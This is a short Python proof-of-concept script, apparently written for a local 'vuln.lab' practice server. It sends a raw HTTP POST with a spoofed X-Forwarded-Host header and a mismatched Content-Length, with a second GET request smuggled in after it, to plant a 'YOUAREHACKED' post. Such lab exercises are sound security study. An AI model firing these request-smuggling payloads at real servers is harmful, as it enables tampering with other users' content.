
import socket

HOST = '127.0.0.1'  # Адрес твоего сервера
PORT = 8000         # Порт (если Flask dev-сервер, то 5000)

payload = (
    "POST /post/1 HTTP/1.1\r\n"
    "Host: vuln.lab\r\n"
    "Content-Length: 19\r\n"
    "X-Forwarded-Host: hacked\r\n"
    "\r\n"
    "body=YOUAREHACKED!!!"
    "GET /last_post HTTP/1.1\r\n"
    "Host: vuln.lab\r\n"
    "\r\n"
)

with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())

